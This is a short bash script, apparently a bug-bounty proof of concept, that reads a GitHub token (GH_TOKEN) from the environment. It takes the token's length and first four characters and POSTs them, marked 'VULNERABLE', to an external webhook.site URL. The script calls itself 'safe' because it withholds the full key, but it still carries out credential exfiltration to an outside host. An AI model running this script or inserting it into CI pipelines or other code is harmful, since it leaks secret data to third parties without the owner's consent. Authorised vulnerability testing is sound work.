#!/bin/bash
# Proof of Concept: Safe Token Exfiltration
# This proves access to the GH_TOKEN without stealing the full key.

if [ -n "$GH_TOKEN" ]; then
  # Calculate metadata to prove access
  TOKEN_LENGTH=$(echo -n "$GH_TOKEN" | wc -c)
  TOKEN_PREFIX=$(echo -n "$GH_TOKEN" | cut -c 1-4)

  # Send the proof to your webhook
  curl -X POST -H "Content-Type: application/json" \
  -d "{\"status\":\"VULNERABLE\", \"length\":\"$TOKEN_LENGTH\", \"prefix\":\"$TOKEN_PREFIX\"}" \
  https://webhook.site/357556bb-ee31-4209-bfd7-a48449f99b01
fi